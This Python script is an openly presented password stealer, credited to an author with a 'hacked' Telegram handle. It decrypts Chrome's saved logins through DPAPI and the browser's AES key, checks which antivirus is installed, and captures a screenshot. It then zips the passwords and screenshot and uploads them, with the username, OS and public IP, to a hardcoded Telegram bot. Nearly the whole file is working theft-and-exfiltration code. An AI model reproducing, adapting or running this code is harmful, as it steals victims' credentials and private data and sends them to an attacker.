import os
import sys
import shutil
import sqlite3
import win32crypt
import json,base64
import requests
import platform
import zipfile
import telebot 
import colorama
from colorama import Fore, Back, Style
import os
os.system('clear')
print(Fore.BLUE + '''
coder: krik 
my telegram: I_hacked_you666

    ''')
input(Fore.YELLOW + "Нажмите Enter")
os.system('clear')
print(Fore.RED +    '-----------------------------------------')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '-----------------------------------------')

print(Fore.RED +    '-----------------------------------------')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '-----------------------------------------')

print(Fore.RED +    '-----------------------------------------')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '|' + Fore.GREEN +  "          YOU HACKED  YOU HACKED       " + Fore.RED + '|')
print(Fore.RED +    '-----------------------------------------')

token = '5213770104:AAEmF37Cc0nSaVTul3MSe_-DQv8B2eo9UH8'
user = '878205362'
bot = telebot.TeleBot(token)

from PIL import ImageGrab
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)

APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

NONCE_BYTE_SIZE = 12

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def get_cipher(key):
    cipher = Cipher(
        algorithms.AES(key),
        None,
        backend=default_backend()
    )
    return cipher


def dpapi_decrypt(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def unix_decrypt(encrypted):
    if sys.platform.startswith('linux'):
        password = 'peanuts'
        iterations = 1
    else:
        raise NotImplementedError

    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2

    salt = 'saltysalt'
    iv = ' ' * 16
    length = 16
    key = PBKDF2(password, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(encrypted[3:])
    return decrypted[:-ord(decrypted[-1])]

def get_key_from_local_state():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'],
        r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def aes_decrypt(encrypted_txt):
    encoded_key = get_key_from_local_state()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi_decrypt(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = get_cipher(key)
    return decrypt(cipher,encrypted_txt[15:],nonce)

class ChromePassword:
    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path,_temp_path)
        self.show_password(_temp_path)

    def show_password(self,db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])
            _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self,encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi_decrypt(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None

    def save_passwords(self):
        with open('C:\\ProgramData\\Passwords.txt','w',encoding='utf-8') as f:
            f.writelines(self.passwordList)

if __name__=="__main__":
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()



if os.path.exists('C:\\Program Files\\Windows Defender'):
   av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
   av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
   av = 'AVG'
if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
   av = 'Avira'
if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
   av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
   av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
   av = 'Comodo'
if os.path.exists('C:\\Program Files\\DrWeb'):
   av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
   av = 'ESET'
if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
   av = 'Grizzly Pro'
if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
   av = 'Kaspersky'
if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
   av = 'Malware fighter'
if os.path.exists('C:\\Program Files\\360\\Total Security'):
   av = '360 Total Security'
else:
   pass

screen = ImageGrab.grab()
screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
screen.close()

zname=r'C:\\ProgramData\\Passwords.zip'
newzip=zipfile.ZipFile(zname,'w')
newzip.write(r'C:\\ProgramData\\Passwords.txt')
newzip.write(r'C:\\ProgramData\\Screenshot.jpg')
newzip.close()
os.remove('C:\\ProgramData\\Passwords.txt')
os.remove('C:\\ProgramData\\Screenshot.jpg')


try:
 passwords = open('C:\\ProgramData\\Passwords.zip', 'rb')
 r = requests.get('http://ip.42.pl/raw')
 IP = r.text
 bot.send_document(user, passwords, caption='Взломан! ✔️'
 '\n' + '\nPC » ' + os.getlogin() + 
 '\nOS » ' + platform.system() + ' ' + platform.release() + 
 '\n'
 '\nAV » ' + av +
 '\n'
 '\nIP » ' + IP)
except:
    pass
